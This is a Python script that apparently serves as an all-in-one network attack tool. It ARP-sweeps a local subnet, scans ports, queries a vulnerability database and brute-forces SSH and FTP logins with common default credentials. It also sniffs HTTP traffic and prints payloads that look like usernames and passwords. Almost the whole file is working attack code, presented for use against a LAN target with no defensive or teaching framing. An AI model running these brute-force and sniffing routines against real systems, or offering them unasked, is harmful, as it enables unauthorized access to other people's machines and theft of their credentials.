import socket
import vulners
import paramiko
import ftplib
from scapy.all import ARP, Ether, srp, HTTPRequest, Raw, sniff
import concurrent.futures
import dns.resolver


def scan(ip, ports, max_workers=20, timeout=1):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list, _ = srp(arp_request_broadcast, timeout=timeout, verbose=False)

    clients_list = [{"ip": element[1].psrc, "mac": element[1].hwsrc} for element in answered_list]

    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_port = {
            executor.submit(scan_port, client["ip"], port, timeout): (client, port)
            for port in ports
            for client in clients_list
        }
        for future in concurrent.futures.as_completed(future_to_port):
            client, port = future_to_port[future]
            try:
                result = future.result()
                if result:
                    open_ports.append({
                        "ip": result["ip"],
                        "mac": result["mac"],
                        "port": port,
                        "service": result["service"],
                        "vulnerabilities": result.get("vulnerabilities", []),
                        "ssh_credentials": result.get("ssh_credentials", []),
                        "ftp_credentials": result.get("ftp_credentials", [])
                    })
            except Exception as e:
                print(f"Error scanning port {port} on {client['ip']}: {str(e)}")

    return clients_list, open_ports


def scan_port(ip, port, timeout):
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            service = get_service_name(port)
            vulnerabilities = scan_for_vulnerabilities(ip, port)
            ssh_credentials = [] if port != 22 else brute_force_ssh(ip)
            ftp_credentials = [] if port != 21 else brute_force_ftp(ip)

            return {"ip": ip, "mac": get_mac_address(ip), "port": port, "service": service,
                    "vulnerabilities": vulnerabilities, "ssh_credentials": ssh_credentials,
                    "ftp_credentials": ftp_credentials}
    except Exception as e:
        return None


def scan_for_vulnerabilities(ip, port):
    vulners_api = vulners.Vulners()
    vulnerabilities = []
    try:
        results = vulners_api.portvulns(ip, port)
        vulnerabilities.extend(result.get("title") for result in results)
    except Exception as e:
        print(f"Error scanning for vulnerabilities on {ip}:{port}: {str(e)}")
    return vulnerabilities


def brute_force_ssh(ip):
    credentials = []
    common_usernames = ["admin", "root", "user"]
    common_passwords = ["password", "admin123", "123456"]
    for username in common_usernames:
        for password in common_passwords:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, port=22, username=username, password=password, timeout=1)
                credentials.append({"username": username, "password": password})
                ssh.close()
            except paramiko.AuthenticationException:
                pass
            except Exception as e:
                print(f"Error during SSH brute force on {ip}: {str(e)}")
    return credentials


def brute_force_ftp(ip):
    credentials = []
    common_usernames = ["admin", "root", "user"]
    common_passwords = ["password", "admin123", "123456"]
    for username in common_usernames:
        for password in common_passwords:
            try:
                ftp = ftplib.FTP()
                ftp.connect(ip, port=21, timeout=1)
                ftp.login(username, password)
                credentials.append({"username": username, "password": password})
                ftp.quit()
            except Exception as e:
                print(f"Error during FTP brute force on {ip}: {str(e)}")
    return credentials


def packet_sniffer(interface="eth0"):
    try:
        sniff(iface=interface, store=False, prn=process_packet)
    except Exception as e:
        print(f"Error during packet sniffing: {str(e)}")


def process_packet(packet):
    if packet.haslayer(HTTPRequest):
        url = get_url(packet)
        print(f"HTTP Request: {url}")

        login_info = get_login_info(packet)
        if login_info:
            print(f"Possible username/password found: {login_info}")


def get_url(packet):
    return packet[HTTPRequest].Host + packet[HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(Raw):
        load = str(packet[Raw].load)
        keywords = ["username", "user", "login", "password", "pass"]
        if any(keyword in load for keyword in keywords):
            return load


def dns_enum(domain):
    try:
        result = dns.resolver.resolve(domain, 'A')
        ip_addresses = [ip.address for ip in result]
        return ip_addresses
    except dns.exception.DNSException as e:
        print(f"Error during DNS enumeration for {domain}: {str(e)}")
        return []


def get_service_name(port):
    try:
        service = socket.getservbyport(port)
        return service
    except Exception:
        return "Unknown"


def get_mac_address(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list, _ = srp(arp_request_broadcast, timeout=1, verbose=False)

    return answered_list[0][1].hwsrc if answered_list else None


if __name__ == "__main__":
    target_ip = "192.168.1.1"
    target_ports = [80, 22, 21]
    clients, open_ports = scan(target_ip, target_ports)
    print("Discovered Clients:", clients)
    print("Open Ports:", open_ports)

    target_domain = "example.com"
    dns_results = dns_enum(target_domain)
    print(f"DNS Enumeration for {target_domain}: {dns_results}")

    # Uncomment and customize interface as needed
    # packet_sniffer("eth0")
